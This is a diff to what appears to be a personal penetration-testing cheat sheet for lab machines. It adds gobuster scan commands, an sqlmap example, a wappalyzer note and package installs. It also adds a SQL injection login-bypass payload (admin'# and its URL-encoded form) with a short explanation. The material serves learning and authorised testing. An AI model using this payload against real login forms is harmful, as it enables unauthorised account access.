@@ -26,7 +26,11 @@ sudo nmap -sC -sV -oA nmap/example 192.168.0.1
 ## gobuster
 
 ```shell
+# kali linux
 gobuster dir -u http://192.168.0.1 -w /opt/SecLists/Discovery/web-Content/raft-small-words.txt -x php -o gobuster.out
+
+# arch
+gobuster dir -u http://10.129.20.199 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x js, html -o gobuster.out
 
 ```
 
@@ -42,6 +46,15 @@ Have sqlmap try a number of injects for you.
 
 ```shell
 sqlmap -r login.req --batch
+```
+
+### So basic sql injection
+
+```.php
+username=admin'#&password=a
+# Web encode '# and forward to the host. In this case the php site will take think the sql query ends.
+# So they query only checks for username admin and if it exists thats okay. The password query isn't forwarded.
+username=admin%27%23&password=a
 ```
 
 ## remote exec
@@ -91,12 +104,18 @@ Password recovery utility, used together with a word list.
 hashcat file-containing-password /path/to/wordlist
 ```
 
+## web tools
+
+wappalyzer = a tool that scans homepages as a extensions and gives you information what technologies it uses.
+For example php, js etc.
+
 ## install
 
 ```shell
 pacman -S nmap
 yay -S gobuster
 yay -S sqlmap
+yay -S seclists
 ```
 
 [burp](https://portswigger.net/burp/releases/professional-community-2022-2-3)
